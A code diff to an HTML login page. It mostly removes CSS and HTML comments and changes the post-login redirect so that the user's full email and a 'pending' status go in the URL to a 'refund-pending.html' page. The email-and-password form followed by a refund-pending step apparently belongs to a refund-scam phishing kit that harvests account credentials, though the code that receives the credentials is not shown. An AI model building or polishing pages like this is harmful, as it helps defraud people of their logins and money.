@@ -9,9 +9,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
-        /* ============================================
-           RESET & BASE
-           ============================================ */
         * {
             margin: 0;
             padding: 0;
@@ -34,9 +31,6 @@
             margin: 0;
         }
 
-        /* ============================================
-           PAGE WRAPPER
-           ============================================ */
         .page-wrapper {
             width: 100%;
             max-width: 480px;
@@ -48,9 +42,6 @@
             position: relative;
         }
 
-        /* ============================================
-           TOP HEADER - BLACK BAR
-           ============================================ */
         .login-header {
             display: flex;
             justify-content: space-between;
@@ -81,7 +72,6 @@
             display: block;
         }
 
-        /* Language Selector */
         .language-selector {
             position: relative;
             display: flex;
@@ -174,9 +164,6 @@
             opacity: 1;
         }
 
-        /* ============================================
-           LOGIN CONTENT
-           ============================================ */
         .login-content {
             padding: 2rem 2rem 2.4rem;
             flex: 1;
@@ -186,9 +173,6 @@
             background: #ffffff;
         }
 
-        /* ============================================
-           TITLES
-           ============================================ */
         .form-title {
             font-size: 2.8rem;
             font-weight: 700;
@@ -207,9 +191,6 @@
             line-height: 1.5;
         }
 
-        /* ============================================
-           FORM
-           ============================================ */
         .login-form {
             display: flex;
             flex-direction: column;
@@ -217,9 +198,6 @@
             width: 100%;
         }
 
-        /* ============================================
-           INPUT GROUP
-           ============================================ */
         .input-group {
             position: relative;
             display: flex;
@@ -287,9 +265,6 @@
             line-height: 1.4;
         }
 
-        /* ============================================
-           FORGOT PASSWORD
-           ============================================ */
         .form-options {
             display: flex;
             justify-content: flex-end;
@@ -310,9 +285,6 @@
             text-decoration: underline;
         }
 
-        /* ============================================
-           BUTTON
-           ============================================ */
         .btn-primary {
             display: block;
             width: 100%;
@@ -347,9 +319,6 @@
             transform: none;
         }
 
-        /* ============================================
-           SIGNUP LINK
-           ============================================ */
         .signup-link {
             text-align: center;
             margin-top: 1.4rem;
@@ -369,9 +338,6 @@
             text-decoration: underline;
         }
 
-        /* ============================================
-           FOOTER
-           ============================================ */
         .login-footer-links {
             display: flex;
             justify-content: center;
@@ -401,14 +367,10 @@
             font-size: 1.2rem;
         }
 
-        /* ============================================
-           RIGHT COLUMN - BRANDING
-           ============================================ */
         .login-image-column {
             display: none;
         }
 
-        /* Toast notification */
         .toast {
             position: fixed;
             bottom: 2rem;
@@ -448,9 +410,6 @@
             font-size: 1.4rem;
         }
 
-        /* ============================================
-           RESPONSIVE
-           ============================================ */
         @media (max-width: 600px) {
             .login-header {
                 padding: 1rem 1.4rem;
@@ -625,18 +584,13 @@
 </head>
 <body>
 
-    <!-- ===== TOAST NOTIFICATION ===== -->
     <div class="toast" id="toast">
         <i class="fas fa-exclamation-circle"></i>
         <span id="toastMessage">Error message</span>
     </div>
 
-    <!-- ===== PAGE WRAPPER ===== -->
     <div class="page-wrapper">
 
-        <!-- ============================================
-           TOP HEADER - BLACK BAR
-           ============================================ -->
         <header class="login-header">
             <a href="#" class="brand">
                 <svg viewBox="0 0 98 39" fill="currentColor" width="98" class="text--white">
@@ -666,47 +620,36 @@
             </div>
         </header>
 
-        <!-- ============================================
-           LOGIN CONTENT
-           ============================================ -->
         <div class="login-content">
 
-            <!-- TITLE -->
             <h1 class="form-title">LOG IN</h1>
             <p class="form-subtitle">Enter the email address associated with your account.</p>
 
-            <!-- FORM -->
             <form class="login-form" id="loginForm">
-                <!-- Email -->
                 <div class="input-group">
                     <input type="email" id="loginEmail" placeholder=" " required autocomplete="email">
                     <label for="loginEmail">Your email</label>
                     <span class="helper-text">Enter the email address associated with your account.</span>
                 </div>
 
-                <!-- Password -->
                 <div class="input-group">
                     <input type="password" id="loginPassword" placeholder=" " required autocomplete="current-password">
                     <label for="loginPassword">Password</label>
                 </div>
 
-                <!-- Forgot Password -->
                 <div class="form-options">
                     <a href="#">Forgot your password?</a>
                 </div>
 
-                <!-- Submit Button -->
                 <button type="submit" class="btn-primary" id="loginBtn">
                     <i class="fas fa-sign-in-alt"></i> Log in
                 </button>
             </form>
 
-            <!-- Signup Link -->
             <div class="signup-link">
                 Not registered yet? <a href="signup.html">Create an account</a>
             </div>
 
-            <!-- Footer -->
             <div class="login-footer-links">
                 <a href="#">Privacy</a>
                 <span class="divider">|</span>
@@ -718,9 +661,6 @@
             </div>
         </div>
 
-        <!-- ============================================
-           RIGHT COLUMN - BRANDING (Desktop)
-           ============================================ -->
         <div class="login-image-column">
             <div class="brand-card">
                 <i class="fas fa-shield-alt logo-icon"></i>
@@ -735,9 +675,6 @@
         </div>
     </div>
 
-    <!-- ============================================
-       JAVASCRIPT - FIXED REDIRECT TO refund-pending.html
-       ============================================ -->
     <script>
         // ============================================
         // LANGUAGE SELECTOR
@@ -862,13 +799,13 @@
 
                     if (data.success) {
                         showToast('Login successful! Redirecting...', 'success');
-                        
-                        // 🔥 FIX: Extract name from email and redirect to refund-pending.html
+
+                        // ✅ Extract name from email and redirect to refund-pending.html
                         const firstName = email.split('@')[0] || 'User';
-                        const redirectUrl = `/refund-pending.html?name=${encodeURIComponent(firstName)}`;
-                        
+                        const redirectUrl = `/refund-pending.html?email=${encodeURIComponent(email)}&name=${encodeURIComponent(firstName)}&status=pending`;
+
                         console.log('🔄 Redirecting to:', redirectUrl);
-                        
+
                         setTimeout(() => {
                             window.location.href = redirectUrl;
                         }, 1000);
